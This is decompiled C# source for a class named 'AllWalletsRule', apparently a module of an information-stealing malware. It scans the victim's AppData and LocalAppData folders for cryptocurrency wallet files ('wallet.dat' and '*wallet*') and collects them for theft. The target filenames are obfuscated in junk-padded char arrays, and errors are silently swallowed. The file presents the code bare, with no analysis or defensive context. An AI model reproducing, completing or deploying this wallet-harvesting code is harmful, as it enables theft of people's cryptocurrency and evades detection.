using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x02000012 RID: 18
public class AllWalletsRule : FileScannerRule
{
	// Token: 0x0600004D RID: 77 RVA: 0x00004C8C File Offset: 0x00002E8C
	public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
	{
		return filePath.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty).Replace(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\", string.Empty);
	}

	// Token: 0x0600004E RID: 78 RVA: 0x00004CDC File Offset: 0x00002EDC
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			List<string> list2 = new List<string>();
			list2.AddRange(FileCopier.FindPaths(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), 2, 1, new string[]
			{
				new string(new char[]
				{
					'w',
					'a',
					'a',
					's',
					'f',
					'l',
					'l',
					'e',
					'a',
					's',
					'f',
					't',
					'.',
					'd',
					'a',
					't',
					'a',
					's',
					'f'
				}).Replace("asf", string.Empty),
				new string(new char[]
				{
					'w',
					'a',
					'a',
					's',
					'f',
					'l',
					'l',
					'e',
					't',
					'a',
					's',
					'f'
				}).Replace("asf", string.Empty)
			}));
			list2.AddRange(FileCopier.FindPaths(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), 2, 1, new string[]
			{
				new string(new char[]
				{
					'w',
					'a',
					'a',
					's',
					'f',
					'l',
					'l',
					'e',
					'a',
					's',
					'f',
					't',
					'.',
					'd',
					'a',
					't',
					'a',
					's',
					'f'
				}).Replace("asf", string.Empty),
				new string(new char[]
				{
					'w',
					'a',
					'a',
					's',
					'f',
					'l',
					'l',
					'e',
					't',
					'a',
					's',
					'f'
				}).Replace("asf", string.Empty)
			}));
			try
			{
				foreach (string fileName in list2)
				{
					string tag = new FileInfo(fileName).Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty).Replace(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\", string.Empty).Split(new char[]
					{
						'\\'
					})[0];
					list.Add(new FileScannerArg
					{
						Tag = tag,
						Directory = new FileInfo(fileName).Directory.FullName,
						Pattern = "*wallet*",
						Recoursive = false
					});
				}
			}
			catch
			{
			}
		}
		catch
		{
		}
		return list;
	}
}
